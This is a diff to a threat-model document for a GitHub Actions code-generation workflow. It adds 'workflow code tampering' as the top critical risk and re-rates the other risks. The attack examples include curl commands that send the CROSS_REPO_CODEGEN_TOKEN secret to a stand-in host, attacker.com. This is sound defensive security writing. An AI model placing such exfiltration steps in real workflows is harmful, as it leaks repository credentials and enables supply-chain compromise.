@@ -23,9 +23,105 @@ This document outlines security risks, mitigations, and best practices for the A
 
 ## 🔴 Critical Risks & Mitigations
 
-### 1. **Command Injection via User Input**
+### 1. **Workflow Code Tampering**
 
-**Risk Level**: 🔴 **CRITICAL**
+**Risk Level**: 🔴 **CRITICAL** 
+
+**Attack Vector**:
+```yaml
+# Attacker modifies .github/workflows/ai-first.yml in their PR
+- name: Steal token
+  env:
+    GH_TOKEN: ${{ secrets.CROSS_REPO_CODEGEN_TOKEN }}
+  run: |
+    # Remove security checks
+    # Exfiltrate token to attacker's server
+    curl -X POST https://attacker.com/steal -d "token=$GH_TOKEN"
+```
+
+**Impact**:
+- **Token exfiltration**: Full PAT token compromise
+- **Bypass all security checks**: Attacker controls the workflow code
+- **Unauthorized operations**: Delete issues, create malicious PRs, access private repos
+- **Supply chain attack**: Inject malicious code into downstream repositories
+
+**Why This is Critical**:
+When a PR is opened, GitHub Actions **runs the workflow file from the PR branch**, not from the base branch. This means:
+- ✅ Attacker can modify the workflow to remove all security checks
+- ✅ Attacker can add code to exfiltrate secrets
+- ✅ Code-based mitigations (org checks, input validation) can be bypassed
+- ✅ Even draft PRs can be used to test exploits locally
+
+**Attack Flow Visualization**:
+```
+┌─────────────────────────────────────────────────────────────────┐
+│ Step 1: Attacker forks repository                               │
+└─────────────────────────────────────────────────────────────────┘
+                              ↓
+┌─────────────────────────────────────────────────────────────────┐
+│ Step 2: Attacker modifies .github/workflows/ai-first.yml        │
+│   - Removes organization membership check                       │
+│   - Adds: curl attacker.com/steal?token=$GH_TOKEN              │
+└─────────────────────────────────────────────────────────────────┘
+                              ↓
+┌─────────────────────────────────────────────────────────────────┐
+│ Step 3: Attacker creates PR with:                               │
+│   - Modified workflow file                                       │
+│   - Small change to src/**.cs file (to trigger workflow)       │
+│   - "codegen-experiment" label                                  │
+└─────────────────────────────────────────────────────────────────┘
+                              ↓
+┌─────────────────────────────────────────────────────────────────┐
+│ Step 4: WITHOUT repository setting:                             │
+│   ❌ Workflow runs immediately with attacker's code             │
+│   ❌ CROSS_REPO_CODEGEN_TOKEN exposed to attacker               │
+│   ❌ Token sent to attacker.com                                 │
+└─────────────────────────────────────────────────────────────────┘
+                              ↓
+┌─────────────────────────────────────────────────────────────────┐
+│ Step 5: Attacker now has full token access to:                  │
+│   - microsoft/Agent365-dotnet                                   │
+│   - microsoft/Agent365-python                                   │
+│   - microsoft/Agent365-nodejs                                   │
+└─────────────────────────────────────────────────────────────────┘
+
+vs.
+
+┌─────────────────────────────────────────────────────────────────┐
+│ WITH repository setting "Require approval":                     │
+│   ✅ Workflow shows "Waiting for approval"                      │
+│   ✅ Maintainer reviews modified workflow file                  │
+│   ✅ Maintainer rejects malicious PR                            │
+│   ✅ Token never exposed                                        │
+└─────────────────────────────────────────────────────────────────┘
+```
+
+**Mitigation** ✅ **REQUIRED - REPOSITORY SETTING**:
+
+**This is the ONLY effective mitigation for this vulnerability:**
+
+Navigate to: **Settings → Actions → General → Fork pull request workflows from outside collaborators**
+
+Select: ☑️ **"Require approval for all outside collaborators"**
+
+This ensures:
+- ✅ Workflows from external PRs **do NOT run automatically**
+- ✅ A maintainer must **manually review the workflow code** before execution
+- ✅ Protection happens at GitHub's infrastructure level (cannot be bypassed by code)
+- ✅ Secrets are NOT exposed to unapproved workflow runs
+
+**Status**: ⚠️ **MUST BE CONFIGURED** - Without this setting, all other security measures can be bypassed!
+
+**Additional Defense-in-Depth** (not sufficient alone):
+- Branch protection on `main` requiring reviews for workflow changes
+- CODEOWNERS file requiring security team approval for `.github/workflows/` changes
+- Regular audits of workflow modification PRs
+
+---
+
+### 2. **Command Injection via User Input**
+
+**Risk Level**: 🔴 **HIGH** (Critical if workflow tampering protection is not enabled)
 
 **Attack Vector**:
 ```yaml
@@ -61,23 +157,24 @@ run: |
 
 ---
 
-### 2. **Unauthorized Workflow Execution**
+### 3. **Unauthorized Workflow Execution**
 
-**Risk Level**: 🔴 **CRITICAL**
+**Risk Level**: 🟡 **MEDIUM** (Mitigated by workflow tampering protection + org check)
 
 **Attack Vector**:
-- External contributor submits PR modifying `.github/workflows/ai-first.yml`
-- Workflow modified to: `run: curl attacker.com?secret=${{ secrets.CROSS_REPO_CODEGEN_TOKEN }}`
-- Gets approved and merged (or runs on PR from fork)
+- External contributor (non-Microsoft) submits legitimate PR
+- Workflow would run automatically with access to secrets
+- Could trigger expensive API operations or spam issues
 
 **Impact**:
-- Complete secret exposure
-- Unauthorized access to all repositories
-- Workflow backdoor for future attacks
+- Unauthorized use of PAT token for legitimate but unwanted operations
+- API rate limit exhaustion
+- Spam in target repositories
+- Resource consumption
 
 **Mitigation** ✅ **IMPLEMENTED**:
 
-**1. Organization Membership Check**:
+**1. Organization Membership Check** (Code-based defense):
 ```yaml
 - name: Check if PR author is a bot
   run: |
@@ -89,7 +186,7 @@ run: |
     fi
 ```
 
-**2. GitHub Repository Settings** (REQUIRED):
+**2. GitHub Repository Settings** (Primary defense):
 ```
 Settings → Actions → General → Fork pull request workflows from outside collaborators:
   ☑️ Require approval for all outside collaborators
@@ -118,9 +215,9 @@ Settings → Branches → Branch protection rules for main/master:
 
 ---
 
-### 3. **Token Privilege Escalation**
+### 4. **Token Privilege Escalation**
 
-**Risk Level**: 🟠 **HIGH**
+**Risk Level**: 🟠 **MEDIUM** (Good with Fine-Grained PAT)
 
 **Current State**: ✅ **GOOD**
 - Fine-Grained PAT token (`CROSS_REPO_CODEGEN_TOKEN`) with scoped access:
@@ -183,9 +280,9 @@ Personal Access Token → Fine-grained tokens
 
 ---
 
-### 4. **Secret Leakage via Logs**
+### 5. **Secret Leakage via Logs**
 
-**Risk Level**: 🟠 **HIGH**
+**Risk Level**: 🟠 **MEDIUM**
 
 **Attack Vector**:
 - Workflow logs are public in public repositories
@@ -231,7 +328,7 @@ gh issue create --title "..." --body "..." 2>/dev/null
 
 ---
 
-### 5. **Cross-Site Scripting (XSS) in Issues**
+### 6. **Cross-Site Scripting (XSS) in Issues**
 
 **Risk Level**: 🟡 **MEDIUM**
 
@@ -266,7 +363,7 @@ PR_BODY_ESCAPED=$(echo "$PR_BODY" | sed 's/[<>]/\\&/g')
 
 ---
 
-### 6. **Rate Limit Exhaustion (DoS)**
+### 7. **Rate Limit Exhaustion (DoS)**
 
 **Risk Level**: 🟡 **MEDIUM**
 
@@ -500,34 +597,45 @@ Settings → Secrets and variables → Actions:
 
 ## 📊 Current Security Posture Summary
 
-| Security Control | Status | Notes |
-|-----------------|--------|-------|
-| **Token Type** | ✅ Fine-Grained PAT | Scoped to 3 repositories only |
-| **Input Sanitization** | ✅ Implemented | JSON escaping + jq parsing |
-| **Org Membership Check** | ✅ Implemented | Blocks external contributors |
-| **Workflow Approval** | ⚠️ Requires Config | Must enable in repository settings |
-| **CODEOWNERS** | ⚠️ Not Created | Must create before public release |
-| **Branch Protection** | ⚠️ Requires Config | Must enable required reviews |
-| **Token Rotation** | ✅ Scheduled | 90-day expiration |
-| **Monitoring** | 🔄 Recommended | Set up alerts for failures |
+| Security Control | Status | Priority | Notes |
+|-----------------|--------|----------|-------|
+| **Workflow Tampering Protection** | 🔴 **CRITICAL - NOT CONFIGURED** | **P0** | **BLOCKS PUBLIC RELEASE** - Enable "Require approval for all outside collaborators" |
+| **Token Type** | ✅ Fine-Grained PAT | P1 | Scoped to 3 repositories only |
+| **Input Sanitization** | ✅ Implemented | P1 | JSON escaping + jq parsing |
+| **Org Membership Check** | ✅ Implemented | P2 | Blocks external contributors (bypassed if workflow tampered) |
+| **CODEOWNERS** | ⚠️ Not Created | P1 | Must create before public release |
+| **Branch Protection** | ⚠️ Requires Config | P1 | Must enable required reviews |
+| **Token Rotation** | ✅ Scheduled | P2 | 90-day expiration |
+| **Monitoring** | 🔄 Recommended | P3 | Set up alerts for failures |
 
 ### Risk Assessment After Mitigations
 
-| Risk Category | Severity | Mitigation Status |
-|--------------|----------|-------------------|
-| Command injection | 🔴 Critical | ✅ **Fully Mitigated** |
-| Unauthorized execution | 🔴 Critical | ✅ **Mitigated** (requires settings) |
-| Token privilege escalation | 🟠 High | ✅ **Mitigated** (Fine-Grained PAT) |
-| Secret leakage | 🟠 High | ✅ **Protected** (GitHub masking) |
-| XSS in issues | 🟡 Medium | ✅ **Protected** (GitHub sanitization) |
-| Rate limit DoS | 🟡 Medium | ✅ **Mitigated** (concurrency control) |
+| Risk Category | Severity | Mitigation Status | Depends On |
+|--------------|----------|-------------------|------------|
+| **Workflow code tampering** | 🔴 **CRITICAL** | 🔴 **NOT MITIGATED** | ⚠️ Requires repository setting |
+| Command injection | 🔴 High | ✅ **Mitigated** | Workflow tampering protection |
+| Unauthorized execution | 🟡 Medium | ✅ **Mitigated** | Workflow tampering protection |
+| Token privilege escalation | 🟠 Medium | ✅ **Mitigated** | Fine-Grained PAT |
+| Secret leakage | 🟠 Medium | ✅ **Protected** | GitHub masking |
+| XSS in issues | 🟡 Low | ✅ **Protected** | GitHub sanitization |
+| Rate limit DoS | 🟡 Low | ✅ **Mitigated** | Concurrency control |
 
-**Overall Risk Level**: 🟢 **Acceptable** (with required repository settings applied)
+**Overall Risk Level**: 🔴 **UNACCEPTABLE FOR PUBLIC RELEASE** 
+
+⚠️ **BLOCKING ISSUE**: Workflow tampering protection is NOT configured. Without this setting, all other security measures can be bypassed by modifying the workflow file in a PR.
+
+**To make public**: Enable "Require approval for all outside collaborators" in repository settings → Risk level becomes 🟢 **Acceptable**
 
 ---
 
 ## 📝 Version History
 
+- **v1.1** (2025-12-01): Critical workflow tampering vulnerability identified
+  - **IDENTIFIED CRITICAL RISK**: Workflow code can be modified in PRs to bypass all security
+  - Elevated workflow tampering to #1 critical risk (blocks public release)
+  - Clarified that repository setting "Require approval for all outside collaborators" is MANDATORY
+  - Updated risk assessment: Status is 🔴 UNACCEPTABLE until repository setting is enabled
+  - Re-prioritized controls: Workflow tampering protection is P0 (blocking)
 - **v1.0** (2025-11-25): Initial security analysis
   - Added command injection mitigations (JSON escaping)
   - Implemented organization membership checks
